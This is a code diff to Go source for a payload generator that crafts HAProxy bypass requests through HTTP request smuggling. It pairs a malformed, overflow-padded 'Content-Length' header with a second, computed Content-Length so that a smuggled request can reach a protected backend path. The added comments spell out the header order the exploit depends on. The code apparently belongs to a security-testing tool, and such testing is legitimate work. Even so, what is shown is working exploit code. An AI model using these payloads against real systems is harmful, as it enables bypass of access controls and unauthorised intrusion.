@@ -60,12 +60,14 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 			path, publicPath, host)
 
 		// Properly calculate the content length dynamically for the *second* Content-Length header:
-		// This is specific to the exploit technique.
-		calculatedContentLengthForSecondHeader := len(smuggledRequest) // Reverted
+		calculatedContentLengthForSecondHeader := len(smuggledRequest)
 
 		malformedHeaderName := "Content-Length" + overflowPattern + ":"
 
 		// Create payload with dynamically calculated Content-Length
+		// CRITICAL: The order of headers MUST be preserved exactly as specified here
+		// for this exploit to work. The malformed header MUST be first, followed by
+		// the regular Content-Length header.
 		job := BypassPayload{
 			OriginalURL:  targetURL,
 			Method:       "POST",
@@ -75,17 +77,20 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 			BypassModule: bypassModule,
 			Body:         smuggledRequest,
 			Headers: []Headers{
+				// 1. Malformed header MUST be first - this will be processed first by HAProxy
 				{
 					Header: malformedHeaderName, // e.g., "Content-Length0...<255a's>:"
 					Value:  "",                  // Empty value, to be handled by BuildRawHTTPRequest
 				},
+				// 2. Regular Content-Length MUST be second - this will be processed by backend server
 				{
 					Header: "Content-Length",
-					Value:  fmt.Sprintf("%d", calculatedContentLengthForSecondHeader), // Reverted
+					Value:  fmt.Sprintf("%d", calculatedContentLengthForSecondHeader),
 				},
+				// 3. Connection header
 				{
 					Header: "Connection",
-					Value:  "keep-alive", // Reverted
+					Value:  "keep-alive",
 				},
 			},
 		}
